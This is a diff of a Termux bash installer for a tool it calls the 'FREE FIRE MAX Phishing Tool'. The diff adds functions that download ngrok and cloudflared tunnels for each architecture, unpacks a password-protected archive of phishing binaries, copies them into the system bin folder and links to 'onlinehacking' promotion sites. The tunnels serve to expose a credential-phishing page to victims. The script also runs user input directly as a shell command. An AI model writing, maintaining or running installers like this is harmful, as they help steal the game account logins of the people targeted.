@@ -44,6 +44,111 @@ echo -e "\e[92m
 
 
 
+
+function setup_ngrok() {
+echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Download Ngrok...\e[0m  "
+	if [ ! -f  "${BIN}/ngrok" ]; then
+             if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+		     ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip"
+             elif [[ "$arch" == *'aarch64'* ]]; then
+                     ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip"
+             elif [[ "$arch" == *'x86_64'* ]]; then
+                    if [[ "$ArNam" == *'amd64'* ]]; then
+                                ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
+                    else
+                                ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip"
+                    fi
+             else
+                                ngrok_url="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip"
+             fi
+		launch="installing server-2, size@4mb";splashdown="Installed.";echo
+		(wget --quiet $ngrok_url -O ngrok.zip)	
+		unzip -q ngrok.zip && rm -rf ngrok.zip && chmod +x ngrok
+        else
+              echo ""
+        fi
+}
+
+
+function setup_cloudflare() {
+echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Download Cloudflared...\e[0m  "
+	if [ ! -f ${BIN}/cloudflared ]; then
+             if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+		     cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
+             elif [[ "$arch" == *'aarch64'* ]]; then
+                     cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
+             elif [[ "$arch" == *'x86_64'* ]]; then
+                    if [[ "$ArNam" == *'amd64'* ]]; then
+                                cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
+                    else
+                                cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
+                    fi
+             else
+                                cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"
+             fi
+	          launch="Installing server-1, size@25mb";splashdown="installed.";echo
+	          (wget --quiet ${cloudd} -O cloudflared)& 
+	          
+        else 
+	    echo ""
+	fi
+}
+
+
+ngroktoken() {
+echo ""
+echo -e "\e[93m 
+ ███▄    █   ▄████  ██▀███   ▒█████   ██ ▄█▀
+ ██ ▀█   █  ██▒ ▀█▒▓██ ▒ ██▒▒██▒  ██▒ ██▄█▒ 
+▓██  ▀█ ██▒▒██░▄▄▄░▓██ ░▄█ ▒▒██░  ██▒▓███▄░ 
+▓██▒  ▐▌██▒░▓█  ██▓▒██▀▀█▄  ▒██   ██░▓██ █▄ 
+▒██░   ▓██░░▒▓███▀▒░██▓ ▒██▒░ ████▓▒░▒██▒ █▄
+░ ▒░   ▒ ▒  ░▒   ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▒ ▓▒
+░ ░░   ░ ▒░  ░   ░   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒ ▒░
+   ░   ░ ░ ░ ░   ░   ░░   ░ ░ ░ ░ ▒  ░ ░░ ░ 
+         ░       ░    ░         ░ ░  ░  ░   
+\e[0m\n"
+echo ""
+echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Want to give \e[96mNgrok \e[32mToken ? \e[1;91m (y/n) : \e[0m' option
+echo""
+echo""
+echo""
+
+if [[ $option == *'y'* ]]; then
+clear
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
+echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!        Requirement Ngrok Token       !!\e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
+echo ""
+echo""
+echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
+echo ""
+echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
+echo ""
+read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
+$token
+echo ""
+fi
+if [[ $option == *'n'* ]]; then
+clear
+fi
+}
+
+uninstall() {
+echo -e ""
+rm -rf /data/data/com.termux/files/usr/bin/ngrok
+rm -rf /data/data/com.termux/files/usr/bin/cloudflared
+rm -rf /data/data/com.termux/files/usr/bin/.SUMAN/1 /data/data/com.termux/files/usr/bin/.SUMAN/2 /data/data/com.termux/files/usr/bin/.SUMAN/3 /data/data/com.termux/files/usr/bin/.SUMAN/4 /data/data/com.termux/files/usr/bin/.SUMAN/5 /data/data/com.termux/files/usr/bin/.SUMAN/6 /data/data/com.termux/files/usr/bin/.SUMAN/7 /data/data/com.termux/files/usr/bin/.SUMAN/8 /data/data/com.termux/files/usr/bin/.SUMAN/9 /data/data/com.termux/files/usr/bin/.SUMAN/0
+rm -rf /data/data/com.termux/files/usr/bin/FF
+rm -rf /data/data/com.termux/files/usr/bin/FreeFire
+rm -rf /data/data/com.termux/files/usr/bin/FreeFire-Phishing
+rm -rf /data/data/com.termux/files/usr/bin/OnlineHacking
+echo -e ""
+}
+
+welcome() {
+echo -e ""
 echo -e ""
 echo ""
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
@@ -79,7 +184,7 @@ echo ""
 echo -e ""
 echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m How To Install And Use This Tool Play Video \e[0m"
 echo ""
-echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Video Link :\e[0m\e[1;36m https://play.onlinehacking.xyz/v/ZIwSEz  "
+echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Video Link :\e[0m\e[1;36m https://www.hacktube.xyz/v/  "
 echo ""
 echo ""
 echo ""
@@ -87,9 +192,13 @@ read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click Enter to continue : \e[0m' o
 echo""
 echo""
 echo ""
-termux-open-url https://www.onlinehacking.in/free-fire-account-hack-phishing-tool-with-termux
+termux-open-url https://www.onlinehacking.in/
 echo ""
 clear
+}
+
+
+
 echo ""
 echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The FREE FIRE MAX Phishing Tool Please Wait....  \e[0m"
 echo -e ""
@@ -140,8 +249,6 @@ apt install zip -y
 apt install unrar -y
 pkg install wget -y
 pkg install ruby -y
-pkg install gem -y
-gem install lolcat
 clear
 echo""
 logo2
@@ -151,9 +258,9 @@ echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   --------------------
 echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;93m  !!         Download Link Services         !!\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
 echo ""
-wget -q --show-progress https://github.com/Online-Hacking/Mr-OnlineHacking/raw/main/Ngrok/Ngrok%20Old/ngrok -O ngrok
+setup_ngrok
 echo ""
-wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared-linux-arm64
+setup_cloudflare
 echo""
 clear
 echo ""
@@ -170,66 +277,31 @@ unrar x -Password SUMAN-MAX.rar
 rm -rf SUMAN.rar
 rm -rf SUMAN-MAX.rar
 chmod +x ngrok
-chmod +x cloudflared-linux-arm64
+chmod +x cloudflared
 chmod +x FF
 chmod +x FreeFire
 clear
 
-echo ""
-echo -e "\e[93m 
- ███▄    █   ▄████  ██▀███   ▒█████   ██ ▄█▀
- ██ ▀█   █  ██▒ ▀█▒▓██ ▒ ██▒▒██▒  ██▒ ██▄█▒ 
-▓██  ▀█ ██▒▒██░▄▄▄░▓██ ░▄█ ▒▒██░  ██▒▓███▄░ 
-▓██▒  ▐▌██▒░▓█  ██▓▒██▀▀█▄  ▒██   ██░▓██ █▄ 
-▒██░   ▓██░░▒▓███▀▒░██▓ ▒██▒░ ████▓▒░▒██▒ █▄
-░ ▒░   ▒ ▒  ░▒   ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▒ ▓▒
-░ ░░   ░ ▒░  ░   ░   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒ ▒░
-   ░   ░ ░ ░ ░   ░   ░░   ░ ░ ░ ░ ▒  ░ ░░ ░ 
-         ░       ░    ░         ░ ░  ░  ░   
-\e[0m\n"
-echo ""
-echo ""
-read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Want to give \e[96mNgrok \e[32mToken ? \e[1;91m (y/n) : \e[0m' option
-echo""
-echo""
-echo""
-
-if [[ $option == *'y'* ]]; then
-clear
-echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
-echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!        Requirement Ngrok Token       !!\e[0m'
-echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
-echo ""
-echo""
-echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
-echo ""
-echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
-echo ""
-read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
-$token
-echo ""
-fi
-if [[ $option == *'n'* ]]; then
-clear
-fi
+ngroktoken
 
 echo
-cp -R cloudflared-linux-arm64 ngrok .SUMAN/1/
-cp -R cloudflared-linux-arm64 ngrok .SUMAN/2/
-cp -R cloudflared-linux-arm64 ngrok .SUMAN/3/
-cp -R cloudflared-linux-arm64 ngrok .SUMAN/4/
-cp -R cloudflared-linux-arm64 ngrok .SUMAN/5/
-cp -R cloudflared-linux-arm64 ngrok .SUMAN/6/
-cp -R cloudflared-linux-arm64 ngrok .SUMAN/7/
-cp -R cloudflared-linux-arm64 ngrok .SUMAN/8/
-cp -R cloudflared-linux-arm64 ngrok .SUMAN/9/
-cp -R cloudflared-linux-arm64 ngrok .SUMAN/0/
+cp -R cloudflared ngrok .SUMAN/1/
+cp -R cloudflared ngrok .SUMAN/2/
+cp -R cloudflared ngrok .SUMAN/3/
+cp -R cloudflared ngrok .SUMAN/4/
+cp -R cloudflared ngrok .SUMAN/5/
+cp -R cloudflared ngrok .SUMAN/6/
+cp -R cloudflared ngrok .SUMAN/7/
+cp -R cloudflared ngrok .SUMAN/8/
+cp -R cloudflared ngrok .SUMAN/9/
+cp -R cloudflared ngrok .SUMAN/0/
 chmod 7777 FreeFire-Phishing
 clear
 echo
+uninstall
 echo
 cp -R ngrok /data/data/com.termux/files/usr/bin
-cp -R cloudflared-linux-arm64 /data/data/com.termux/files/usr/bin
+cp -R cloudflared /data/data/com.termux/files/usr/bin
 cp -R .SUMAN /data/data/com.termux/files/usr/bin
 cp -R FF /data/data/com.termux/files/usr/bin
 cp -R FreeFire /data/data/com.termux/files/usr/bin
